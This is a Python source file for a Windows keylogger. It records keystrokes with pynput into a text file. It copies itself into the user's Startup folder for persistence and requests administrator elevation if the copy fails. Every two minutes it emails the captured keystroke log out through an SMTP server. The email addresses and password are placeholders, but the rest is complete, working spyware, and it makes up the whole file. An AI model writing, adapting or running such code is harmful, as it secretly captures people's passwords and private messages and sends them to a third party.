import ctypes
import os
import shutil
import smtplib
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput import keyboard


def find_exe():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    exe_file_path = os.path.join(startup_folder, "cat.exe")
    return os.path.isfile(exe_file_path)


def add_to_startup_windows():
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    try:
        shutil.copy(script_path, startup_folder)
    except PermissionError:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


def send_email(subject, body, to_email, attachment_path, smtp_server, smtp_port, sender_email):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    if attachment_path:
        attachment = open(attachment_path, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{attachment_path}"')
        msg.attach(part)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(sender_email, "example")

        server.sendmail(sender_email, to_email, msg.as_string())


def key_pressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            if key == key.backspace:
                logKey.write("\b")

            elif key == key.space:
                logKey.write(" ")


def main():
    # email inputs
    subject = "Keys"
    attachment_path = os.path.join(os.getcwd(), "keyfile.txt")
    body = "This is an email sent from Python."
    to_email = "example@gmail.com"
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    sender_email = "example@gmail.com"

    exe_exists = find_exe()
    if not exe_exists:
        add_to_startup_windows()

    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()

    time.sleep(120)

    while True:
        time.sleep(120)
        send_email(subject, body, to_email, attachment_path, smtp_server, smtp_port, sender_email)


if __name__ == "__main__":
    main()
